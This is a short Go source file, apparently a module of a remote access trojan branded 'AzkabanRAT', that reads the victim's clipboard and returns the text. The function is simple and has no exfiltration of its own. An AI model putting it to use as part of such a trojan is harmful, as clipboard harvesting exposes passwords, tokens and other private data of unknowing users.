package clipboard

import (
    "github.com/atotto/clipboard"
)

func ReadClipboard() string {
    text, err := clipboard.ReadAll()
    if err != nil {
        return "[AzkabanRAT] Failed to read clipboard."
    }
    return text
}
